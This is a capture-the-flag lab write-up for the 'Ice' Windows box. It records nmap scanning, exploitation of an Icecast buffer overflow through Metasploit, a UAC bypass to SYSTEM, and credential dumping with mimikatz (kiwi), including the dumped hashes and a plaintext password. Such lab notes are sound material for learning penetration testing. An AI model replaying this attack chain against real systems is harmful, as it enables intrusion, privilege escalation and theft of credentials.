# Ice Notes
---

# My IP = 10.8.19.163

# Target IP = 10.10.146.142
___

1.  Scan the target with NMAP:

> fping 10.10.146.142

> 10.10.146.142 is alive

> nmap -sC -sV --script vuln -A 10.10.146.142 | tee Ice.nmap

	NMAP Results:

		135/tcp   open  msrpc        Microsoft Windows RPC
		139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
		445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
		3389/tcp  open  tcpwrapped
		5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
		8000/tcp  open  http         Icecast streaming media server
		|       Slowloris tries to keep many connections to the target web server open and hold
		|       them open as long as possible.  It accomplishes this by opening connections to
		49152/tcp open  msrpc        Microsoft Windows RPC
		49153/tcp open  msrpc        Microsoft Windows RPC
		49154/tcp open  msrpc        Microsoft Windows RPC
		49158/tcp open  msrpc        Microsoft Windows RPC
		49159/tcp open  msrpc        Microsoft Windows RPC
		49160/tcp open  msrpc        Microsoft Windows RPC

2. RDP is on port 3389.

3. Icecast service on port 8000. Vulnerable with CVE-2004-1561 buffer overflow and can get a meterpreter shell through metasploit.

4. Used exploit/windows/http/icecast_header in metaspoit. Shell gained.

> getuid - Dark-PC

> pwd - C:\Program Files (x86)\Icecast2 Win32

> getsystem - Failed

Check processes running as admin.

> ps -a

Try to gain privileged access by meterpreter commands.

> run post/multi/recon/local_exploit_suggester

Results:

	[*] 10.10.146.142 - Collecting local exploits for x86/windows...
	[*] 10.10.146.142 - 31 exploit checks are being tried...
	[+] 10.10.146.142 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
	[+] 10.10.146.142 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
	[+] 10.10.146.142 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
	[+] 10.10.146.142 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
	[+] 10.10.146.142 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
	[+] 10.10.146.142 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
	[+] 10.10.146.142 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
	[+] 10.10.146.142 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
	[+] 10.10.146.142 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.

5. Used bypass_eventvwr in Metaspoit:

> background sessions 2.

> set lhosts and port, run exploit/windows/local/bypassuac_eventvwr.

New Meterpreter session created. 

Migrated a NT/Authority System service spoolsv.exe

> migrate -N spoolsv.exe

6. Load mimikatz into the meterpreter shell

> load kiwi

7. Expands help menu to add kiwi commands that are for password manipulation.

Interested in the command "creds_all".
	

>
	--------  ------   --                                ----                              ----
	Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

	wdigest credentials
	===================

	Username  Domain     Password
	--------  ------     --------
	(null)    (null)     (null)
	DARK-PC$  WORKGROUP  (null)
	Dark      Dark-PC    Password01!

	tspkg credentials
	=================

	Username  Domain   Password
	--------  ------   --------
	Dark      Dark-PC  Password01!

	kerberos credentials
	====================

		Username  Domain     Password
		--------  ------     --------
		(null)    (null)     (null)
		Dark      Dark-PC    Password01!
		dark-pc$  WORKGROUP  (null)
...

8. Go through various meterpreter help commands.